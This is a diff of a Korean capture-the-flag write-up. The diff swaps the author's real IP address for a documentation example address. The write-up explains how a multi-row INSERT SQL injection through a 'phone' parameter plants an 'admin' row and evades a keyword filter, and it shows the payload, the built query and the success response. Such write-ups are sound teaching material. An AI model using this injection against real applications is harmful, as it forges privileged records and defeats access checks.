@@ -85,9 +85,10 @@ insert into chall35(id,ip,phone) values('guest','<내 IP>', {phone} )
 
 심을 `admin` 행의 `ip`는 **서버가 보는 내 `REMOTE_ADDR`** 와 똑같아야 한다
 (관리자 확인 질의가 그 값으로 비교하기 때문). 서버가 보는 내 IP를 먼저 확인했다.
+(실제 IP는 익명화해 아래 문서용 예시값으로 표기한다.)
 
 ```text
-REMOTE_ADDR = 14.41.76.65
+REMOTE_ADDR = 203.0.113.45
 ```
 
 ### 4-2. phone 페이로드 설계
@@ -96,18 +97,18 @@ MySQL은 `INSERT ... VALUES (...), (...)` 처럼 **한 번에 여러 행**을 �
 `phone` 자리에서 첫 괄호를 닫고, 콤마로 **두 번째 행**을 이어 붙인다.
 
 ```text
-phone = 0),('admin','14.41.76.65',0
+phone = 0),('admin','203.0.113.45',0
 ```
 
 소스의 템플릿 `values('{id}','{ip}',{phone})` 에 넣으면 질의가 이렇게 완성된다.
 
 ```sql
 insert into chall35(id,ip,phone)
-values('guest','14.41.76.65',0),('admin','14.41.76.65',0)
+values('guest','203.0.113.45',0),('admin','203.0.113.45',0)
 ```
 
-- 앞 `0)` → 첫 행 `('guest','14.41.76.65',0)` 를 닫는다.
-- `,('admin','14.41.76.65',0` → 두 번째 행을 시작하고,
+- 앞 `0)` → 첫 행 `('guest','203.0.113.45',0)` 를 닫는다.
+- `,('admin','203.0.113.45',0` → 두 번째 행을 시작하고,
 - 템플릿의 **원래 닫는 괄호 `)`** 가 이 두 번째 행을 닫아 준다.
 
 필터 점검: `phone` 안에 `*`·`/`·`=`·`select`·`-`·`#`·`;` **어느 것도 없다.**
@@ -116,13 +117,13 @@ values('guest','14.41.76.65',0),('admin','14.41.76.65',0)
 ### 4-3. 실제 전송과 결과
 
 ```console
-GET /challenge/web-17/?id=guest&phone=0),('admin','14.41.76.65',0
+GET /challenge/web-17/?id=guest&phone=0),('admin','203.0.113.45',0
 → Done
 → old-35 Pwned. You got 35point. Congratz!
 ```
 
 INSERT가 두 행을 심자, 뒤이어 도는 **관리자 확인 질의**
-(`... where id='admin' and ip='14.41.76.65'`)가 방금 심은 행을 읽어 통과시켰다.
+(`... where id='admin' and ip='203.0.113.45'`)가 방금 심은 행을 읽어 통과시켰다.
 
 ## 5. 결과
 
